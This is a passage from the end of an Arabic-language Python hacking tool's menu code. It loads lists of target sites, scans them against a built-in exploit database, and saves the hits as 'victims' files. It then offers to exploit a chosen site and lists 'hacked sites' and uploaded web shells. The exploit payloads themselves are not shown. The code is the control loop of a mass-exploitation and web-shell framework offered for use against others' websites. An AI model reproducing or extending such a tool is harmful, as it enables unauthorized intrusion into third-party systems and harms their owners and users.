            elif choice == "3":
                # فحص ملف كامل
                print(f"\n{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                print(f"{col.BOLD}{col.C}📁 فحص ملف كامل{col.RESET}")
                print(f"{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                
                targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
                files = [f for f in os.listdir(targets_dir) if f.endswith('.txt') and not f.startswith('victims')]
                
                if files:
                    print(f"{col.Y}الملفات المتاحة:{col.RESET}")
                    for i, f in enumerate(files, 1):
                        print(f"  {col.C}[{i}]{col.RESET} {f}")
                    
                    try:
                        file_idx = int(input(f"{col.B}اختر ملف: {col.RESET}")) - 1
                        if 0 <= file_idx < len(files):
                            filepath = os.path.join(targets_dir, files[file_idx])
                            with open(filepath, 'r', encoding='utf-8') as f:
                                targets = [line.strip() for line in f if line.strip()]
                            
                            print(f"{col.G}[+] تم تحميل {len(targets)} هدف{col.RESET}")
                            
                            print_legendary_exploits()
                            exploit_id = input(f"{col.B}اختر رقم الثغرة: {col.RESET}")
                            
                            if exploit_id in EXPLOITS_DB:
                                exploit = EXPLOITS_DB[exploit_id]
                                vulnerable = advanced_scan(targets, exploit)
                                
                                if vulnerable:
                                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                    victims_file = os.path.join(FRAMEWORK_PATH, 'targets', f"victims_{timestamp}.txt")
                                    with open(victims_file, 'w', encoding='utf-8') as f:
                                        for v in vulnerable:
                                            f.write(f"{v} | {exploit['name']} | {exploit['cve']}\n")
                                    
                                    generate_html_report(vulnerable, exploit)
                                    
                                    print(f"\n{col.G}[+] تم العثور على {len(vulnerable)} هدف ثغر!{col.RESET}")
                                    exploit_choice = input(f"{col.B}[?] هل تريد استغلال أحدها؟ (y/n): {col.RESET}")
                                    if exploit_choice.lower() == 'y':
                                        for i, v in enumerate(vulnerable, 1):
                                            print(f"  {col.C}[{i}]{col.RESET} {v}")
                                        target_idx = int(input(f"{col.B}اختر رقم الهدف: {col.RESET}")) - 1
                                        if 0 <= target_idx < len(vulnerable):
                                            advanced_exploit(vulnerable[target_idx], exploit)
                            else:
                                print(f"{col.R}[-] رقم ثغرة غير صحيح!{col.RESET}")
                    except:
                        pass
                else:
                    print(f"{col.Y}[!] لا توجد ملفات أهداف! استخدم الخيار 1 أولاً للبحث{col.RESET}")
                
                input(f"\n{col.Y}[!] اضغط Enter للمتابعة...{col.RESET}")
                
            elif choice == "4":
                # التقارير والمخترقات
                print(f"\n{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                print(f"{col.BOLD}{col.C}📊 التقارير والمخترقات{col.RESET}")
                print(f"{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                
                # عرض الأهداف الثغرية
                targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
                victims_files = [f for f in os.listdir(targets_dir) if f.startswith('victims_')]
                
                if victims_files:
                    print(f"\n{col.G}🎯 المواقع المخترقة:{col.RESET}")
                    for f in victims_files[-5:]:
                        path = os.path.join(targets_dir, f)
                        with open(path, 'r', encoding='utf-8') as file:
                            lines = file.readlines()
                            for line in lines[-3:]:
                                print(f"  {col.R}💀{col.RESET} {line.strip()}")
                
                # عرض الشيلات
                shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
                if os.path.exists(shells_file):
                    print(f"\n{col.G}🐚 الشيلات المرفوعة:{col.RESET}")
                    with open(shells_file, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        for line in lines[-5:]:
                            print(f"  {col.C}🔗{col.RESET} {line.strip()}")
                
                # عرض التقارير HTML
                reports_dir = os.path.join(FRAMEWORK_PATH, 'reports')
                reports = [f for f in os.listdir(reports_dir) if f.endswith('.html')]
                if reports:
                    print(f"\n{col.G}📄 التقارير المتاحة:{col.RESET}")
                    for r in reports[-5:]:
                        print(f"  {col.C}📊{col.RESET} {r}")
                
                input(f"\n{col.Y}[!] اضغط Enter للمتابعة...{col.RESET}")
                
            elif choice == "5":
                # تحديث الأداة
                print(f"\n{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                print(f"{col.BOLD}{col.C}🔄 تحديث الأداة{col.RESET}")
                print(f"{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                
                print(f"{col.Y}[*] جاري سحب آخر التحديثات من GitHub...{col.RESET}")
                result = os.system("git pull origin main --allow-unrelated-histories")
                
                if result == 0:
                    print(f"{col.G}[+] تم التحديث بنجاح إلى الإصدار {VERSION}!{col.RESET}")
                    print(f"{col.Y}[!] أعد تشغيل الأداة لتطبيق التحديثات{col.RESET}")
                else:
                    print(f"{col.R}[-] فشل التحديث! حاول يدوياً: git pull origin main{col.RESET}")
                
                input(f"\n{col.Y}[!] اضغط Enter للمتابعة...{col.RESET}")
                
            elif choice == "6":
                print(f"\n{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                print(f"{col.BOLD}{col.G}👑 مع السلامة يا بطل! استمر في التألق 👑{col.RESET}")
                print(f"{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                sys.exit(0)
                
            else:
                print(f"{col.R}✗ خيار غير صحيح!{col.RESET}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{col.Y}[!] تم الإلغاء بواسطة المستخدم{col.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{col.R}[!] خطأ غير متوقع: {e}{col.RESET}")
            time.sleep(2)

if __name__ == "__main__":
    main()